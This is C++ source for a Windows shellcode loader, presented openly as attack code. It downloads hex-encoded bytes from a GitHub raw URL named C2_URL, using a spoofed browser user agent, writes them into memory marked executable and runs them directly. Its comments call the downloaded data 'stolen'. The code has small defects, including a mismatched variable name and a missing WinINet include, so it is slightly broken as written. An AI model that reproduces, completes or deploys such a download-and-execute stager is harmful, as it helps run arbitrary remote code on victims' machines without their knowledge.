#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <sstream>

// IMPORTANT: Replace the URL below with your ACTUAL "Raw" GitHub link
const char* C2_URL = "https://raw.githubusercontent.com/Freshman21445/Taste/refs/heads/main/payload_data.txt";

// This function turns the text numbers into actual machine code
void execute_hex_string(const std::string& hex_data) {
    std::vector<unsigned char> bytes;
    for (size_t i = 0; i < hex_data.length(); i += 2) {
        std::string byteString = hex_data.substr(i, 2);
        unsigned char byte = (unsigned char)strtol(byteString.c_str(), NULL, 16);
        bytes.push_back(byte);
    }

    void* exec_mem = VirtualAlloc(NULL, bytes.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) return;

    memcpy(exec_mem, bytes.data(), bytes.size());
    void (*payload)() = (void (*)())exec_mem;
    payload();
}

int main() {
    // 1. Create a connection to the "Internet" (the website)
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_AGENT_PREFER_URL, NULL, NULL, 0);
    if (hInternet == NULL) return 1;

    HINTERNET hConnect = InternetOpenUrlA(hInternet, C2_URL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        InternetCloseHandle(hInternet);
        return 1;
    }

    // 2. Steal the numbers from your GitHub file
    std::string hex_content;
    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytes_read) && bytes_read > 0) {
        buffer[bytes_read] = '\0';
        hex_content += buffer;
    }

    // 3. Execute the stolen numbers immediately in memory
    if (!hex_content.empty()) {
        execute_hex_string(hex_content);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return 0;
}
